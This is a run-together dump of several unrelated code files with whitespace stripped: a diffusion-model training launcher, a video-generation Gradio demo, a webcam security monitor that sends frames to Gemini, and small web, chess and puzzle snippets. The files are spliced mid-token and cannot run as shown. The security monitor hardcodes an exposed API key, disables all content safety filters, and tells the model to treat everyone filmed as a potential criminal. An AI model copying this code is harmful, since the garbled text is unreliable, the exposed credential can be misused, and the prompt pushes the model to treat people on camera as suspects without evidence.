ain,testanddebugmode,#postfix,resume.#`--keyvalue`argumentsareinterpretedasargumentstothetrainer.#`nested.key=value`argumentsareinterpretedasconfigparameters.#configsaremergedfromleft-to-rightfollowedbycommandlineparameters.#model:#base_learning_rate:float#target:pathtolightningmodule#params:#key:value#data:#target:main.DataModuleFromConfig#params:#batch_size:int#wrap:bool#train:#target:pathtotraindataset#params:#key:value#validation:#target:pathtovalidationdataset#params:#key:value#test:#target:pathtotestdataset#params:#key:value#lightning:(optional,hassanedefaultsandcanbespecifiedoncmdline)#trainer:#additionalargumentstotrainer#logger:#loggertoinstantiate#modelcheckpoint:#modelcheckpointtoinstantiate#callbacks:#callback1:#target:importpath#params:#key:valuenow=datetime.datetime.now().strftime("%Y-%m-%dT%H-%M-%S")#addcwdforconvenienceandtomakeclassesinthisfileavailablewhen#runningas`pythonmain.py`#(inparticular`main.DataModuleFromConfig`)sys.path.append(os.getcwd())parser=get_parser()opt,unknown=parser.parse_known_args()ifopt.nameandopt.resume:raiseValueError("-n/--nameand-r/--resumecannotbespecifiedboth.""Ifyouwanttoresumetraininginanewlogfolder,""use-n/--nameincombinationwith--resume_from_checkpoint")melk_ckpt_name=Nonename=Noneifopt.resume:ifnotos.path.exists(opt.resume):raiseValueError("Cannotfind{}".format(opt.resume))ifos.path.isfile(opt.resume):paths=opt.resume.split("/")#idx=len(paths)-paths[::-1].index("logs")+1#logdir="/".join(paths[:idx])logdir="/".join(paths[:-2])ckpt=opt.resume_,melk_ckpt_name=get_checkpoint_name(logdir)else:assertos.path.isdir(opt.resume),opt.resumelogdir=opt.resume.rstrip("/")ckpt,melk_ckpt_name=get_checkpoint_name(logdir)print("#"*100)print(f'Resumingfromcheckpoint"{ckpt}"')print("#"*100)opt.resume_from_checkpoint=ckptbase_configs=sorted(glob.glob(os.path.join(logdir,"configs/*.yaml")))opt.base=base_configs+opt.base_tmp=logdir.split("/")nowname=_tmp[-1]else:ifopt.name:name="_"+opt.nameelifopt.base:ifopt.no_base_name:name=""else:ifopt.legacy_naming:cfg_fname=os.path.split(opt.base[0])[-1]cfg_name=os.path.splitext(cfg_fname)[0]else:assert"configs"inos.path.split(opt.base[0])[0],os.path.split(opt.base[0])[0]cfg_path=os.path.split(opt.base[0])[0].split(os.sep)[os.path.split(opt.base[0])[0].split(os.sep).index("configs")+1:]#cutawaythefirstone(weassertallconfigsarein"configs")cfg_name=os.path.splitext(os.path.split(opt.base[0])[-1])[0]cfg_name="-".join(cfg_path)+f"-{cfg_name}"name="_"+cfg_nameelse:name=""ifnotopt.no_date:nowname=now+name+opt.postfixelse:nowname=name+opt.postfixifnowname.startswith("_"):nowname=nowname[1:]logdir=os.path.join(opt.logdir,nowname)print(f"LOGDIR:{logdir}")ckptdir=os.path.join(logdir,"checkpoints")cfgdir=os.path.join(logdir,"configs")seed_everything(opt.seed,workers=True)#movebeforemodelinit,incaseatorch.compile(...)iscalledsomewhereifopt.enable_tf32:#pt_version=version.parse(torch.__version__)torch.backends.cuda.matmul.allow_tf32=Truetorch.backends.cudnn.allow_tf32=Trueprint(f"EnablingTF32forPyTorch{torch.__version__}")else:print(f"UsingdefaultTF32settingsforPyTorch{torch.__version__}:")print(f"torch.backends.cuda.matmul.allow_tf32={torch.backends.cuda.matmul.allow_tf32}")print(f"torch.backends.cudnn.allow_tf32={torch.backends.cudnn.allow_tf32}")try:#initandsaveconfigsconfigs=[OmegaConf.load(cfg)forcfginopt.base]cli=OmegaConf.from_dotlist(unknown)config=OmegaConf.merge(*configs,cli)lightning_config=config.pop("lightning",OmegaConf.create())#mergetrainercliwithconfigtrainer_config=lightning_config.get("trainer",OmegaConf.create())#defaulttogputrainer_config["accelerator"]="gpu"#standard_args=default_trainer_args()forkinstandard_args:ifgetattr(opt,k)!=standard_args[k]:trainer_config[k]=getattr(opt,k)ckpt_resume_path=opt.resume_from_checkpointifnot"devices"intrainer_configandtrainer_config["accelerator"]!="gpu":deltrainer_config["accelerator"]cpu=Trueelse:gpuinfo=trainer_config["devices"]print(f"RunningonGPUs{gpuinfo}")cpu=Falsetrainer_opt=argparse.Namespace(**trainer_config)lightning_config.trainer=trainer_config#modelmodel=instantiate_from_config(config.model)#trainerandcallbackstrainer_kwargs=dict()#defaultloggerconfigsdefault_logger_cfgs={"wandb":{"target":"pytorch_lightning.loggers.WandbLogger","params":{"name":nowname,#"save_dir":logdir,"offline":opt.debug,"id":nowname,"project":opt.projectname,"log_model":False,#"dir":logdir,},},"csv":{"target":"pytorch_lightning.loggers.CSVLogger","params":{"name":"testtube",#hackforsbordfanatics"save_dir":logdir,},},}default_logger_cfg=default_logger_cfgs["wandb"ifopt.wandbelse"csv"]ifopt.wandb:#TODOchangeonceleaving"swiffer"configdirectorytry:group_name=nowname.split(now)[-1].split("-")[1]except:group_name=nownamedefault_logger_cfg["params"]["group"]=group_nameinit_wandb(os.path.join(os.getcwd(),logdir),opt=opt,group_name=group_name,config=config,name_str=nowname,)if"logger"inlightning_config:logger_cfg=lightning_config.loggerelse:logger_cfg=OmegaConf.create()logger_cfg=OmegaConf.merge(default_logger_cfg,logger_cfg)trainer_kwargs["logger"]=instantiate_from_config(logger_cfg)#modelcheckpoint-useTrainResult/EvalResult(checkpoint_on=metric)to#specifywhichmetricisusedtodeterminebestmodelsdefault_modelckpt_cfg={"target":"pytorch_lightning.callbacks.ModelCheckpoint","params":{"dirpath":ckptdir,"filename":"{epoch:06}","verbose":True,"save_last":True,},}ifhasattr(model,"monitor"):print(f"Monitoring{model.monitor}ascheckpointmetric.")default_modelckpt_cfg["params"]["monitor"]=model.monitordefault_modelckpt_cfg["params"]["save_top_k"]=3if"modelcheckpoint"inlightning_config:modelckpt_cfg=lightning_config.modelcheckpointelse:modelckpt_cfg=OmegaConf.create()modelckpt_cfg=OmegaConf.merge(default_modelckpt_cfg,modelckpt_cfg)print(f"Mergedmodelckpt-cfg:\n{modelckpt_cfg}")#https://pytorch-lightning.readthedocs.io/en/stable/extensions/strategy.html#defaulttoddpifnotfurtherspecifieddefault_strategy_config={"target":"pytorch_lightning.strategies.DDPStrategy"}if"strategy"inlightning_config:strategy_cfg=lightning_config.strategyelse:strategy_cfg=OmegaConf.create()default_strategy_config["params"]={"find_unused_parameters":False,#"static_graph":True,#"ddp_comm_hook":default.fp16_compress_hook#TODO:experimentwiththis,alsoforDDPSharded}strategy_cfg=OmegaConf.merge(default_strategy_config,strategy_cfg)print(f"strategyconfig:\n++++++++++++++\n{strategy_cfg}\n++++++++++++++")trainer_kwargs["strategy"]=instantiate_from_config(strategy_cfg)#addcallbackwhichsetsuplogdirectorydefault_callbacks_cfg={"setup_callback":{"target":"main.SetupCallback","params":{"resume":opt.resume,"now":now,"logdir":logdir,"ckptdir":ckptdir,"cfgdir":cfgdir,"config":config,"lightning_config":lightning_config,"debug":opt.debug,"ckpt_name":melk_ckpt_name,},},"image_logger":{"target":"main.ImageLogger","params":{"batch_frequency":1000,"max_images":4,"clamp":True},},"learning_rate_logger":{"target":"pytorch_lightning.callbacks.LearningRateMonitor","params":{"logging_interval":"step",#"log_momentum":True},},}ifversion.parse(pl.__version__)>=version.parse("1.4.0"):default_callbacks_cfg.update({"checkpoint_callback":modelckpt_cfg})if"callbacks"inlightning_config:callbacks_cfg=lightning_config.callbackselse:callbacks_cfg=OmegaConf.create()if"metrics_over_trainsteps_checkpoint"incallbacks_cfg:print("Caution:Savingcheckpointseveryntrainstepswithoutdeleting.Thismightrequiresomefreespace.")default_metrics_over_trainsteps_ckpt_dict={"metrics_over_trainsteps_checkpoint":{"target":"pytorch_lightning.callbacks.ModelCheckpoint","params":{"dirpath":os.path.join(ckptdir,"trainstep_checkpoints"),"filename":"{epoch:06}-{step:09}","verbose":True,"save_top_k":-1,"every_n_train_steps":10000,"save_weights_only":True,},}}default_callbacks_cfg.update(default_metrics_over_trainsteps_ckpt_dict)callbacks_cfg=OmegaConf.merge(default_callbacks_cfg,callbacks_cfg)if"ignore_keys_callback"incallbacks_cfgandckpt_resume_pathisnotNone:callbacks_cfg.ignore_keys_callback.params["ckpt_path"]=ckpt_resume_pathelif"ignore_keys_callback"incallbacks_cfg:delcallbacks_cfg["ignore_keys_callback"]trainer_kwargs["callbacks"]=[instantiate_from_config(callbacks_cfg[k])forkincallbacks_cfg]ifnot"plugins"intrainer_kwargs:trainer_kwargs["plugins"]=list()#cmdlinetrainerargs(whichareintrainer_opt)havealwayspriorityoverconfig-trainer-args(whichareintrainer_kwargs)trainer_opt=vars(trainer_opt)trainer_kwargs={key:valforkey,valintrainer_kwargs.items()ifkeynotintrainer_opt}trainer=Trainer(**trainer_opt,**trainer_kwargs)trainer.logdir=logdir####datadata=instantiate_from_config(config.data)#NOTEaccordingtohttps://pytorch-lightning.readthedocs.io/en/latest/datamodules.html#callingtheseourselvesshouldnotbenecessarybutitis.#lightningstilltakescareofpropermultiprocessingthoughdata.prepare_data()#data.setup()print("####Data#####")try:forkindata.datasets:print(f"{k},{data.datasets[k].__class__.__name__},{len(data.datasets[k])}")except:print("datasetsnotyetinitialized.")#configurelearningrateif"batch_size"inconfig.data.params:bs,base_lr=config.data.params.batch_size,config.model.base_learning_rateelse:bs,base_lr=(config.data.params.train.loader.batch_size,config.model.base_learning_rate,)ifnotcpu:ngpu=len(lightning_config.trainer.devices.strip(",").split(","))else:ngpu=1if"accumulate_grad_batches"inlightning_config.trainer:accumulate_grad_batches=lightning_config.trainer.accumulate_grad_batcheselse:accumulate_grad_batches=1print(f"accumulate_grad_batches={accumulate_grad_batches}")lightning_config.trainer.accumulate_grad_batches=accumulate_grad_batchesifopt.scale_lr:model.learning_rate=accumulate_grad_batches*ngpu*bs*base_lrprint("Settinglearningrateto{:.2e}={}(accumulate_grad_batches)*{}(num_gpus)*{}(batchsize)*{:.2e}(base_lr)".format(model.learning_rate,accumulate_grad_batches,ngpu,bs,base_lr))else:model.learning_rate=base_lrprint("++++NOTUSINGLRSCALING++++")print(f"Settinglearningrateto{model.learning_rate:.2e}")#allowcheckpointingviaUSR1defmelk(*args,**kwargs):#runallcheckpointhooksiftrainer.global_rank==0:print("Summoningcheckpoint.")ifmelk_ckpt_nameisNone:ckpt_path=os.path.join(ckptdir,"last.ckpt")else:ckpt_path=os.path.join(ckptdir,melk_ckpt_name)trainer.save_checkpoint(ckpt_path)defdivein(*args,**kwargs):iftrainer.global_rank==0:importpudbpudb.set_trace()importsignalsignal.signal(signal.SIGUSR1,melk)signal.signal(signal.SIGUSR2,divein)#runifopt.train:try:trainer.fit(model,data,ckpt_path=ckpt_resume_path)exceptException:ifnotopt.debug:melk()raiseifnotopt.no_testandnottrainer.interrupted:trainer.test(model,data)exceptRuntimeErroraserr:ifMULTINODE_HACKS:importdatetimeimportosimportsocketimportrequestsdevice=os.environ.get("CUDA_VISIBLE_DEVICES","?")hostname=socket.gethostname()ts=datetime.datetime.utcnow().strftime("%Y-%m-%d%H:%M:%S")resp=requests.get("http://169.254.169.254/latest/meta-data/instance-id")print(f"ERRORat{ts}on{hostname}/{resp.text}(CUDA_VISIBLE_DEVICES={device}):{type(err).__name__}:{err}",flush=True,)raiseerrexceptException:ifopt.debugandtrainer.global_rank==0:try:importpudbasdebuggerexceptImportError:importpdbasdebuggerdebugger.post_mortem()raisefinally:#movenewlycreateddebugprojecttodebug_runsifopt.debugandnotopt.resumeandtrainer.global_rank==0:dst,name=os.path.split(logdir)dst=os.path.join(dst,"debug_runs",name)os.makedirs(os.path.split(dst)[0],exist_ok=True)os.rename(logdir,dst)ifopt.wandb:wandb.finish()#iftrainer.global_rank==0:#print(trainer.profiler.summary())importLinkfrom"next/link";importImagefrom"next/image";exportdefaultfunctionHero(){return(<divclassName=""><divclassName="relative"><divclassName="mx-automax-w-7xl"><divclassName="relativez-10pt-14lg:w-fulllg:max-w-2xl"><svgclassName="absoluteinset-y-0right-8hiddenh-fullw-80translate-x-1/2transformfill-whitelg:block"viewBox="00100100"preserveAspectRatio="none"aria-hidden="true"><polygonpoints="0,090,050,1000,100"/></svg><divclassName="relativepx-6lg:pt-40pb-20lg:px-8lg:pr-0"><divclassName="mx-automax-w-2xllg:mx-0lg:max-w-xl"><h1className="text-4xlfont-boldtracking-tighttext-slate-900sm:text-6xl">CCADECA</h1><pclassName="mt-6text-lgleading-8text-slate-700">WednesdayLunch@GymClassroom</p><pclassName="mt-1text-lgleading-8text-slate-700">GoogleClassroomCode:d3j3u44</p><divclassName="mt-10flexitems-centergap-x-6"><Linkhref="https://docs.google.com/forms/u/1/d/e/1FAIpQLScOLfkmFsTZop_cca565deD4huYJtvuWMTzla1VEDlknbZl-w/viewform?vc=0&c=0&w=1&flr=0"className="rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600">Getstarted</Link><ahref="#about"className="text-smfont-semiboldleading-6text-gray-900">Learnmore<spanaria-hidden="true">→</span></a></div></div></div></div></div><divclassName="lg:absolutelg:inset-y-0lg:right-0lg:w-1/2flexjustify-centerlg:justify-start"><ImageclassName="object-coverlg:aspect-autolg:h-fulllg:w-full"src="/IMG_3374.jpeg"width={600}height={400}alt="Descriptivetextfortheimage"/></div></div></div>);}#Addingthisattheverytopofapp.pytomake'generative-models'directorydiscoverableimportosimportsyssys.path.append(os.path.join(os.path.dirname(__file__),"generative-models"))importmathimportrandomimportuuidfromglobimportglobfrompathlibimportPathfromtypingimportOptionalimportcv2importgradioasgrimportnumpyasnpimporttorchfromeinopsimportrearrange,repeatfromfireimportFirefromhuggingface_hubimporthf_hub_downloadfromomegaconfimportOmegaConffromPILimportImagefromtorchvision.transformsimportToTensorfromscripts.sampling.simple_video_sampleimport(get_batch,get_unique_embedder_keys_from_conditioner,load_model,)fromscripts.util.detection.nsfw_and_watermark_dectectionimportDeepFloydDataFilteringfromsgm.inference.helpersimportembed_watermarkfromsgm.utilimportdefault,instantiate_from_config#Todownloadallsvdmodels#hf_hub_download(repo_id="stabilityai/stable-video-diffusion-img2vid-xt",filename="svd_xt.safetensors",local_dir="checkpoints")#hf_hub_download(repo_id="stabilityai/stable-video-diffusion-img2vid",filename="svd.safetensors",local_dir="checkpoints")#hf_hub_download(repo_id="stabilityai/stable-video-diffusion-img2vid-xt-1-1",filename="svd_xt_1_1.safetensors",local_dir="checkpoints")#Definetherepo,localdirectoryandfilenamerepo_id="stabilityai/stable-video-diffusion-img2vid-xt-1-1"#replacewith"stabilityai/stable-video-diffusion-img2vid-xt"or"stabilityai/stable-video-diffusion-img2vid"forothermodelsfilename="svd_xt_1_1.safetensors"#replacewith"svd_xt.safetensors"or"svd.safetensors"forothermodelslocal_dir="checkpoints"local_file_path=os.path.join(local_dir,filename)#Checkifthefilealreadyexistsifnotos.path.exists(local_file_path):#Ifthefiledoesn'texist,downloadithf_hub_download(repo_id=repo_id,filename=filename,local_dir=local_dir)print("Filedownloaded.")else:print("Filealreadyexists.Noneedtodownload.")version="svd_xt_1_1"#replacewith'svd_xt'or'svd'forothermodelsdevice="cuda"max_64_bit_int=2**63-1ifversion=="svd_xt_1_1":num_frames=25num_steps=30model_config="scripts/sampling/configs/svd_xt_1_1.yaml"else:raiseValueError(f"Version{version}doesnotexist.")model,filter=load_model(model_config,device,num_frames,num_steps,)defsample(input_path:str="assets/test_image.png",#Caneitherbeimagefileorfolderwithimagefilesseed:Optional[int]=None,randomize_seed:bool=True,motion_bucket_id:int=127,fps_id:int=6,version:str="svd_xt_1_1",cond_aug:float=0.02,decoding_t:int=7,#Numberofframesdecodedatatime!ThiseatsmostVRAM.Reduceifnecessary.device:str="cuda",output_folder:str="outputs",progress=gr.Progress(track_tqdm=True),):"""Simplescripttogenerateasinglesampleconditionedonanimage`input_path`ormultipleimages,oneforeachimagefileinfolder`input_path`.IfyourunoutofVRAM,trydecreasing`decoding_t`."""fps_id=int(fps_id)#castingfloatslidervaluestoint)ifrandomize_seed:seed=random.randint(0,max_64_bit_int)torch.manual_seed(seed)path=Path(input_path)all_img_paths=[]ifpath.is_file():ifany([input_path.endswith(x)forxin["jpg","jpeg","png"]]):all_img_paths=[input_path]else:raiseValueError("Pathisnotvalidimagefile.")elifpath.is_dir():all_img_paths=sorted([fforfinpath.iterdir()iff.is_file()andf.suffix.lower()in[".jpg",".jpeg",".png"]])iflen(all_img_paths)==0:raiseValueError("Folderdoesnotcontainanyimages.")else:raiseValueErrorforinput_img_pathinall_img_paths:withImage.open(input_img_path)asimage:ifimage.mode=="RGBA":image=image.convert("RGB")w,h=image.sizeifh%64!=0orw%64!=0:width,height=map(lambdax:x-x%64,(w,h))image=image.resize((width,height))print(f"WARNING:Yourimageisofsize{h}x{w}whichisnotdivisibleby64.Weareresizingto{height}x{width}!")image=ToTensor()(image)image=image*2.0-1.0image=image.unsqueeze(0).to(device)H,W=image.shape[2:]assertimage.shape[1]==3F=8C=4shape=(num_frames,C,H//F,W//F)if(H,W)!=(576,1024):print("WARNING:Theconditioningframeyouprovidedisnot576x1024.Thisleadstosuboptimalperformanceasmodelwasonlytrainedon576x1024.Considerincreasing`cond_aug`.")ifmotion_bucket_id>255:print("WARNING:Highmotionbucket!Thismayleadtosuboptimalperformance.")iffps_id<5:print("WARNING:Smallfpsvalue!Thismayleadtosuboptimalperformance.")iffps_id>30:print("WARNING:Largefpsvalue!Thismayleadtosuboptimalperformance.")value_dict={}value_dict["motion_bucket_id"]=motion_bucket_idvalue_dict["fps_id"]=fps_idvalue_dict["cond_aug"]=cond_augvalue_dict["cond_frames_without_noise"]=imagevalue_dict["cond_frames"]=image+cond_aug*torch.randn_like(image)value_dict["cond_aug"]=cond_augwithtorch.no_grad():withtorch.autocast(device):batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,[1,num_frames],T=num_frames,device=device,)c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=["cond_frames","cond_frames_without_noise",],)forkin["crossattn","concat"]:uc[k]=repeat(uc[k],"b...->bt...",t=num_frames)uc[k]=rearrange(uc[k],"bt...->(bt)...",t=num_frames)c[k]=repeat(c[k],"b...->bt...",t=num_frames)c[k]=rearrange(c[k],"bt...->(bt)...",t=num_frames)randn=torch.randn(shape,device=device)additional_model_inputs={}additional_model_inputs["image_only_indicator"]=torch.zeros(2,num_frames).to(device)additional_model_inputs["num_video_frames"]=batch["num_video_frames"]defdenoiser(input,sigma,c):returnmodel.denoiser(model.model,input,sigma,c,**additional_model_inputs)samples_z=model.sampler(denoiser,randn,cond=c,uc=uc)model.en_and_decode_n_samples_a_time=decoding_tsamples_x=model.decode_first_stage(samples_z)samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)os.makedirs(output_folder,exist_ok=True)base_count=len(glob(os.path.join(output_folder,"*.mp4")))video_path=os.path.join(output_folder,f"{base_count:06d}.mp4")writer=cv2.VideoWriter(video_path,cv2.VideoWriter_fourcc(*"mp4v"),fps_id+1,(samples.shape[-1],samples.shape[-2]),)samples=embed_watermark(samples)samples=filter(samples)vid=((rearrange(samples,"tchw->thwc")*255).cpu().numpy().astype(np.uint8))forframeinvid:frame=cv2.cvtColor(frame,cv2.COLOR_RGB2BGR)writer.write(frame)writer.release()returnvideo_path,seeddefresize_image(image_path,output_size=(1024,576)):image=Image.open(image_path)#Calculateaspectratiostarget_aspect=output_size[0]/output_size[1]#Aspectratioofthedesiredsizeimage_aspect=image.width/image.height#Aspectratiooftheoriginalimage#Resizethencropiftheoriginalimageislargerifimage_aspect>target_aspect:#Resizetheimagetomatchthetargetheight,maintainingaspectrationew_height=output_size[1]new_width=int(new_height*image_aspect)resized_image=image.resize((new_width,new_height),Image.LANCZOS)#Calculatecoordinatesforcroppingleft=(new_width-output_size[0])/2top=0right=(new_width+output_size[0])/2bottom=output_size[1]else:#Resizetheimagetomatchthetargetwidth,maintainingaspectrationew_width=output_size[0]new_height=int(new_width/image_aspect)resized_image=image.resize((new_width,new_height),Image.LANCZOS)#Calculatecoordinatesforcroppingleft=0top=(new_height-output_size[1])/2right=output_size[0]bottom=(new_height+output_size[1])/2#Croptheimagecropped_image=resized_image.crop((left,top,right,bottom))returncropped_imagewithgr.Blocks()asdemo:gr.Markdown("""#CommunitydemoforStableVideoDiffusion-Img2Vid-XT([model](https://huggingface.co/stabilityai/stable-video-diffusion-img2vid-xt),[paper](https://stability.ai/research/stable-video-diffusion-scaling-latent-video-diffusion-models-to-large-datasets))####Researchrelease([_non-commercial_](https://huggingface.co/stabilityai/stable-video-diffusion-img2vid-xt/blob/main/LICENSE)):generate`4s`vidfromasingleimageat(`25frames`at`6fps`).Generationtakes~60sinanA100.[JointhewaitlistforStability'supcomingwebexperience](https://stability.ai/contact).""")withgr.Row():withgr.Column():image=gr.Image(label="Uploadyourimage",type="filepath")generate_btn=gr.Button("Generate")video=gr.Video()withgr.Accordion("Advancedoptions",open=False):seed=gr.Slider(label="Seed",value=42,randomize=True,minimum=0,maximum=max_64_bit_int,step=1,)randomize_seed=gr.Checkbox(label="Randomizeseed",value=True)motion_bucket_id=gr.Slider(label="Motionbucketid",info="Controlshowmuchmotiontoadd/removefromtheimage",value=127,minimum=1,maximum=255,)fps_id=gr.Slider(label="Framespersecond",info="Thelengthofyourvideoinsecondswillbe25/fps",value=6,minimum=5,maximum=30,)image.upload(fn=resize_image,inputs=image,outputs=image,queue=False)generate_btn.click(fn=sample,inputs=[image,seed,randomize_seed,motion_bucket_id,fps_id],outputs=[video,seed],api_name="video",)if__name__=="__main__":demo.queue(max_size=20)demo.launch(share=True)importmatplotlib.pyplotaspltfrompointsimportread_pointsfromvisualizeimportplot_circles_and_pointsCIRCLE=50POINT=1RADIUS_DEGREE=3classCircle:def__init__(self,x,y,r):self.x=xself.y=yself.r=rdef__repr__(self):returnf'({self.x},{self.y})|{self.r}'def__contains__(self,point):x,y=pointreturn(x-self.x)**2+(y-self.y)**2<=self.r**2@propertydefcost(self):returnself.r**RADIUS_DEGREE+CIRCLEdefread_circles(file:str):withopen(file)asf:lines=f.readlines()circles=[Circle(*map(float,line.split()))forlineinlines]returncirclesdefvalid_point(point:tuple,circles:list)->bool:forcircleincircles:ifpointincircle:returnTruereturnFalsedefscore(circles:list,points:list)->int:total=0forpointinpoints:ifvalid_point(point,circles):total+=POINTforcircleincircles:total-=circle.costreturntotalif__name__=='__main__':circles=read_circles('circles.txt')points=read_points('points.txt')#print(score(circles,points))fig,ax=plot_circles_and_points(circles,points)plt.show()importstreamlitasstimportcv2fromultralyticsimportYOLOfromcollectionsimportdequefromthreadingimportThread,Semaphoreimportgoogle.generativeaiasgenaiimportosFPS=30#framespersecondCONFIDENCE_THRESHOLD=0.6#facedetectionconfidencethresholdLOWER_VIDEO_FRAMES_THRESHOLD=2*FPS#shortestvideodurationinsecondsUPPER_VIDEO_FRAMES_THRESHOLD=30*FPS#longestvideodurationinsecondsPASSIVE_FRAMES=10*FPS#framestoexportbeforepersonisdetectedPROCESSING_FRAMES=30#process1frameeverynframesNOT_DETECTED_THRESHOLD=2*FPS#numberofframestowaitbeforestoppingrecordingPROMPT='Youareanalyzingthesecuritycamerafootagetoinformahomeownerforanypotentialcriminalactivityaimedattheirproperty.Assumeallindividualsthatappearinthevideofootagearenotthehomeowner.ThisisaTextmessagekeepitconciseandhighlyinformativeandincludenomarkuporspecialcharecters.Keepthemessageshortat~250characters.'genai.configure(api_key='AIzaSyCUAR7qw9UPOay8T8Pg9-ExH0OJSCNU89E')genai_model=genai.GenerativeModel(model_name='models/gemini-1.5-pro-latest')defdetect_person(image,model)->tuple[bool,float]:results=model.predict(source=image,verbose=False,conf=CONFIDENCE_THRESHOLD)forrinresults:boxes=r.boxesforboxinboxes:iclass=int(box.cls[0])if(iclass==0):confidence=float(box.conf)return(True,confidence)return(False,0)st.set_page_config(page_title='StreamlitWebCamApp')st.title('EagleAI:SecurityMonitorDescriptorwithGoogleGemini')st.caption('PoweredbyOpenCV,Streamlit')cap=cv2.VideoCapture(0)cap.set(3,640)cap.set(4,480)yolo_model=YOLO('yolov9e.pt')yolo_model.to('cuda')defupload_to_gemini(genai,frames,prompt=PROMPT)->str:globalivideorequest=[prompt]temp_files=[]fori,frameinenumerate(frames[1::PROCESSING_FRAMES]):path=f'{ivideo}_frame_{i}.jpg'temp_files.append(path)cv2.imwrite(path,frame)response=genai.upload_file(path)request.append(str(i))request.append(response)response=genai_model.generate_content(request,request_options={'timeout':600},safety_settings={'HATE':'BLOCK_NONE','HARASSMENT':'BLOCK_NONE','SEXUAL':'BLOCK_NONE','DANGEROUS':'BLOCK_NONE'})forpathintemp_files:os.remove(path)print(response.text)sem.release()returnresponse.textphone_number=st.text_input('PhoneNumber','1234567890')frame_placeholder=st.empty()stop_button_pressed=st.button('Stop')pframes=deque(maxlen=PASSIVE_FRAMES)#10secondsofframesat30fpsiframe=0#numberofframesrecordedframes=[]#startrecordingwhenpersonisdetectedandrecorduntilpersonisnotdetectedpdetected=deque(maxlen=NOT_DETECTED_THRESHOLD)ivideo=0sem=Semaphore()threads=[]while(True):success,img=cap.read()bdetected,confidence=detect_person(img,yolo_model)ifimgisnotNone:img=cv2.cvtColor(img,cv2.COLOR_BGR2RGB)frame_placeholder.image(img,channels='RGB')if(bdetected):print('Persondetected!',confidence)frames.append(img)iframe+=1if(iframe>UPPER_VIDEO_FRAMES_THRESHOLD):sem.acquire()thread=Thread(target=upload_to_gemini,args=(genai,list(pframes)+frames))thread.start()threads.append(thread)ivideo+=1frames=[]pframes.clear()iframe=0pdetected.append(True)else:print('Nopersondetected.',confidence)pframes.append(img)pdetected.append(False)if(len(frames)>LOWER_VIDEO_FRAMES_THRESHOLDandall(notpdforpdinpdetected)):sem.acquire()thread=Thread(target=upload_to_gemini,args=(genai,list(pframes)+frames))thread.start()threads.append(thread)ivideo+=1frames=[]pframes.clear()ifcv2.waitKey(1)==ord('q'):breakforthreadinthreads:thread.join()cap.release()cv2.destroyAllWindows()importspeech_recognitionassrfrommoviepy.editorimportAudioFileClipdeftranscribe_video(file_path):#Extractaudiofromthevideofileaudio=AudioFileClip(file_path).subclip()audio.write_audiofile('temp.wav')#Initializerecognizerr=sr.Recognizer()#Openthefilewithsr.AudioFile('temp.wav')assource:#Readtheentireaudiofileaudio_data=r.record(source)text=r.recognize_google(audio_data)returntextif__name__=='__main__':file_path='LinkedInLearning_PremiumInfo.mp4'text=transcribe_video(file_path)print(text)classBoard{constructor(pieces){this.board=[[null,null,null,null,null,null,null,null],[null,null,null,null,null,null,null,null],[null,null,null,null,null,null,null,null],[null,null,null,null,null,null,null,null],[null,null,null,null,null,null,null,null],[null,null,null,null,null,null,null,null],[null,null,null,null,null,null,null,null],[null,null,null,null,null,null,null,null],];for(letpieceofpieces){this.board[piece.row-1][piece.col-1]=piece;}}fen(){letfen='';for(leti=0;i<8;i++){letemptySquares=0;for(letj=0;j<8;j++){letpiece=this.board[i][j];if(!piece){emptySquares++;}else{if(emptySquares>0){fen+=emptySquares;emptySquares=0;}letnotation=piece.bwhite?piece.type.toUpperCase():piece.type.toLowerCase();fen+=notation;}}if(emptySquares>0){fen+=emptySquares;}if(i<7){fen+='/';}}//TODO:addFENnotationforactivecolor,castlingavailability,enpassanttargetsquare,andhalfmoveandfullmovecountersreturnfen;}}classPiece{constructor(bwhite,type,row,col){this.bwhite=bwhite;this.type=type;this.row=row;this.col=col;}toString(){returnthis.bwhite?'w':'b'+this.type+''+this.row+this.col;}}functiongetPieces(){varpieces=[];varhtmlPieces=document.getElementsByClassName('piece');for(vari=0;i<htmlPieces.length;i++){lethtmlPiece=htmlPieces[i];letcolor=htmlPiece.classList[1][0]=='w'?true:false;lettype=htmlPiece.classList[1][1];letrow=htmlPiece.classList[2][8];letcol=htmlPiece.classList[2][7];pieces.push(newPiece(color,type,row,col));}returnpieces;}functionnumToCoord(row,col){return[row,{1:'a',2:'b',3:'c',4:'d',5:'e',6:'f',7:'g',8:'h'}[col]];}//filesarelettersfunctioncoordToNum(rank,file){return[rank,{a:1,b:2,c:3,d:4,e:5,f:6,g:7,h:8}[file]];}functiondisplayFen(){varboard=newBoard(getPieces());document.getElementById('fen').innerHTML=board.fen();}document.addEventListener('click',()=>{varboard=newBoard(getPieces());console.log(board.fen());});#if(fillingandnotbpositive):#group+=1#elif(filling):#volume+=group#gimportNavbarfrom'../components/Navbar';importHerofrom'@/components/Hero';importFooterfrom'../components/Footer';importHeadfrom'next/head';importFeatureCardCollectionfrom'@/components/FeatureCardCollection';importBulkOrderfrom'@/components/BulkOrder';importDifferentiatefrom'@/components/Differentiate';constfeatures=[{title:'Long-Lasting',description:'EnduraScribedryerasemarkerscanwriteupto1.5Xoftraditionaldryerasemarkerswhichmeansyougetmorewritingforyourmoney.TestedonaPen-CoreCircleWritingTester,ourmarkerslast50%longerthanleadingbrands.',image:'/pencore.png',},{title:'Reliable',description:'Ourliquidinkdriesquicklyanderaseseasilyfrommostnon-poroussurfacesandglass.Itisalsolowodorandemitsnounpleasantsmellslikeothermarkers.',image:'/highlighters.png',},{title:'VisibleInkGague',description:'Weincorporateatransparentbarrelwithaprintedgaugesoyoualwaysknowhowmuchinkisleftinyourdryerasemarker.Nomoreguessingorrunningoutofinkunexpectedly!',image:'/permanent.png',},];constHome=()=>{return(<main><Head><title>EnduraScribe</title><linkrel='icon'href='/favicon.png'/></Head><Navbar/><Hero/><FeatureCardCollectionfeatures={features}/><BulkOrder/><Differentiate/><Footer/></main>);};exportdefaultHome;importunittestclassSolution:defbuiltIn(self,nums:list[int])->bool:returnlen(set(nums))!=len(nums)defbruteForce(self,nums:list[int])->bool:while(len(n